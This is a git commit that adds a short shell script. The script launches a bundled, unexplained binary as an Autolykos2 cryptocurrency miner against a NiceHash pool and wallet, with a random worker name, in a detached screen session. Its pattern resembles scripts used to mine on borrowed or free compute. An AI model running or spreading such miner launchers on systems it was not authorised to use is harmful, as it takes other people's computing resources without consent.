b8537cfa451a45cbd75d758638e1dee08dfb3e8b
renilo <88342640+renilo@users.noreply.github.com>
2021-09-21 13:04:55 +0700

    Create kontol2.sh

---
+++ kontol2.sh
@@ -0,0 +1,5 @@
+POOL=stratum+tcp://autolykos.eu-west.nicehash.com:3390
+WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
+WORKER=$(echo $(shuf -i 1-100000 -n 1)-P100)
+chmod +x memek
+screen -dmS running ./memek --algo AUTOLYKOS2 --pool $POOL --user $WALLET.$WORKER
